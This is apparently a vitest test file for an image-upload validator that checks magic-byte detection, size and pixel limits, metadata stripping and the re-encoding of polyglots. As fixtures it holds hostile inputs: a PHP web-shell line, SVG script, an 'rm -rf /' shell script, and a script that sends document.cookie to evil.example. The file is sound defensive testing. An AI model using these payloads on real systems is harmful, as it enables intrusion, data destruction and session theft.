import { describe, expect, it } from 'vitest';
import sharp from 'sharp';
import { MAX_PIXELS, THUMB_MAX, detectFormat, generateDerivatives, validateImage } from './images';

const MAX_BYTES = 50 * 1024 * 1024;

async function jpeg(width = 800, height = 600): Promise<Buffer> {
  return sharp({
    create: { width, height, channels: 3, background: { r: 120, g: 90, b: 60 } },
  })
    .jpeg()
    .toBuffer();
}

async function png(width = 100, height = 100): Promise<Buffer> {
  return sharp({
    create: { width, height, channels: 4, background: { r: 0, g: 0, b: 0, alpha: 1 } },
  })
    .png()
    .toBuffer();
}

describe('detectFormat', () => {
  it('identifies real images by their magic bytes', async () => {
    expect(detectFormat(await jpeg())).toEqual({ mime: 'image/jpeg', ext: 'jpg' });
    expect(detectFormat(await png())).toEqual({ mime: 'image/png', ext: 'png' });
    expect(detectFormat(await sharp(await png()).webp().toBuffer())).toEqual({
      mime: 'image/webp',
      ext: 'webp',
    });
  });

  it('rejects non-images regardless of what they claim to be', () => {
    expect(detectFormat(Buffer.from('<?php system($_GET["c"]); ?>'))).toBeNull();
    expect(detectFormat(Buffer.from('<svg onload="alert(1)"></svg>'))).toBeNull();
    expect(detectFormat(Buffer.from('#!/bin/sh\nrm -rf /\n'))).toBeNull();
    // A ZIP renamed to .jpg — the extension is irrelevant, the bytes are not.
    expect(detectFormat(Buffer.from([0x50, 0x4b, 0x03, 0x04, 0, 0, 0, 0, 0, 0, 0, 0]))).toBeNull();
  });

  it('is not fooled by a signature that appears later in the file', () => {
    // Magic bytes identify a format only at offset 0.
    const disguised = Buffer.concat([Buffer.from('GIF89a-not-really'), Buffer.alloc(64)]);
    expect(detectFormat(Buffer.concat([Buffer.from('junk'), disguised]))).toBeNull();
  });

  it('returns null for a file too short to classify', () => {
    expect(detectFormat(Buffer.from([0xff, 0xd8]))).toBeNull();
  });
});

describe('validateImage', () => {
  it('accepts a real photo and reports its dimensions and digest', async () => {
    const result = await validateImage(await jpeg(800, 600), MAX_BYTES);
    expect(result.ok).toBe(true);
    if (!result.ok) return;

    expect(result.image.width).toBe(800);
    expect(result.image.height).toBe(600);
    expect(result.image.format.mime).toBe('image/jpeg');
    expect(result.image.sha256).toMatch(/^[0-9a-f]{64}$/);
  });

  it('gives identical digests for identical bytes, so duplicates can be detected', async () => {
    const bytes = await jpeg();
    const a = await validateImage(bytes, MAX_BYTES);
    const b = await validateImage(Buffer.from(bytes), MAX_BYTES);
    expect(a.ok && b.ok && a.image.sha256 === b.image.sha256).toBe(true);
  });

  it('rejects an empty upload', async () => {
    const result = await validateImage(Buffer.alloc(0), MAX_BYTES);
    expect(result).toEqual({ ok: false, reason: 'empty' });
  });

  it('rejects an upload over the size limit before decoding it', async () => {
    const result = await validateImage(await jpeg(), 128);
    expect(result).toEqual({ ok: false, reason: 'too_large' });
  });

  it('rejects a script disguised as an image', async () => {
    const result = await validateImage(Buffer.from('<?php system($_GET["c"]); ?>'), MAX_BYTES);
    expect(result).toEqual({ ok: false, reason: 'unrecognised_format' });
  });

  it('rejects an SVG — it is a document that can carry script, not a photo', async () => {
    const svg = Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>');
    const result = await validateImage(svg, MAX_BYTES);
    expect(result).toEqual({ ok: false, reason: 'unrecognised_format' });
  });

  it('rejects a decompression bomb', async () => {
    // ~1.2 gigapixels from a tiny file: trivially cheap to send, ruinous to decode.
    const bomb = await sharp({
      create: { width: 40_000, height: 30_000, channels: 3, background: { r: 0, g: 0, b: 0 } },
      limitInputPixels: false,
    })
      .png({ compressionLevel: 9 })
      .toBuffer();

    expect(40_000 * 30_000).toBeGreaterThan(MAX_PIXELS);
    const result = await validateImage(bomb, MAX_BYTES);
    expect(result.ok).toBe(false);
    if (result.ok) return;
    expect(['too_many_pixels', 'decode_failed']).toContain(result.reason);
  }, 60_000);
});

describe('generateDerivatives', () => {
  it('produces a thumbnail and a preview, both WebP', async () => {
    const { thumb, preview } = await generateDerivatives(await jpeg(2400, 1600));

    expect(detectFormat(thumb.buffer)?.mime).toBe('image/webp');
    expect(detectFormat(preview.buffer)?.mime).toBe('image/webp');
    expect(thumb.bytes).toBeLessThan(preview.bytes);
  });

  it('fits within the target box without distorting the aspect ratio', async () => {
    const { thumb } = await generateDerivatives(await jpeg(2400, 1200));

    expect(Math.max(thumb.width, thumb.height)).toBeLessThanOrEqual(THUMB_MAX);
    // 2:1 in, 2:1 out.
    expect(thumb.width / thumb.height).toBeCloseTo(2, 1);
  });

  it('does not upscale an image smaller than the target', async () => {
    const { thumb, preview } = await generateDerivatives(await jpeg(120, 90));
    expect(thumb.width).toBe(120);
    expect(preview.width).toBe(120);
  });

  it('strips all metadata — GPS and camera identifiers never reach a viewer', async () => {
    const withExif = await sharp(await jpeg())
      .withExif({
        IFD0: { Copyright: 'Somebody', Make: 'ACME', Model: 'SuperCam' },
        IFD2: { GPSLatitudeRef: 'N', GPSLongitudeRef: 'E' },
      })
      .toBuffer();

    // The fixture really does carry EXIF, otherwise this proves nothing.
    expect((await sharp(withExif).metadata()).exif).toBeDefined();

    const { thumb, preview } = await generateDerivatives(withExif);
    expect((await sharp(thumb.buffer).metadata()).exif).toBeUndefined();
    expect((await sharp(preview.buffer).metadata()).exif).toBeUndefined();
  });

  it('neutralises a polyglot: appended payloads do not survive re-encoding', async () => {
    const payload = Buffer.from('<script>fetch("https://evil.example/"+document.cookie)</script>');
    // A valid JPEG with script appended: renders as an image, but is served as HTML
    // by anything that sniffs content instead of trusting the declared type.
    const polyglot = Buffer.concat([await jpeg(), payload]);

    // The polyglot is still a valid image, so it passes validation — which is
    // precisely why re-encoding, not validation, is what defuses it.
    expect(detectFormat(polyglot)?.mime).toBe('image/jpeg');
    expect(polyglot.includes(payload)).toBe(true);

    const { thumb, preview } = await generateDerivatives(polyglot);
    expect(thumb.buffer.includes(payload)).toBe(false);
    expect(preview.buffer.includes(payload)).toBe(false);
    expect(thumb.buffer.toString('latin1')).not.toContain('<script');
    expect(preview.buffer.toString('latin1')).not.toContain('<script');
  });

  it('applies EXIF orientation, so rotated phone photos are not left sideways', async () => {
    // Orientation 6 = rotate 90° clockwise on display. A landscape frame tagged this
    // way must come out portrait once the tag is applied and discarded.
    //
    // The tag must be set via withMetadata(); withExif({IFD0:{Orientation}}) is
    // silently ignored by sharp and leaves the tag at 1, which would make this test
    // pass vacuously.
    const rotated = await sharp(await jpeg(400, 200)).withMetadata({ orientation: 6 }).toBuffer();
    expect((await sharp(rotated).metadata()).orientation).toBe(6);

    const { thumb } = await generateDerivatives(rotated);
    expect(thumb.height).toBeGreaterThan(thumb.width);

    // And the tag itself is gone, so nothing rotates it a second time on display.
    expect((await sharp(thumb.buffer).metadata()).orientation).toBeUndefined();
  });
});
